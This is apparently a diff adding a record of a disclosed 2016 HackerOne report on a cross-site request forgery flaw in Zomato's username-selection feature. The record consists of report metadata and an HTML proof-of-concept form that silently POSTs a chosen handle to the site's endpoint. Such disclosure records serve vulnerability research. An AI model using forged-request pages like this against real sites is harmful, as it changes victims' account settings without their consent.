@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/113857
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/kiraak-boy
+ReportedTo:Zomato(zomato)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:18.03.2016 5:28:06
+
+Summary:
+
+Hello,
+
+Your Application Have Feature To Choose Zomato Handle 
+
+
+POC:-
+
+<html>
+  <body>
+    <form action="https://www.zomato.com/php/username_selector.php" method="POST">
+      <input type="hidden" name="uname" value="googlessssssssssx" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Thanks!
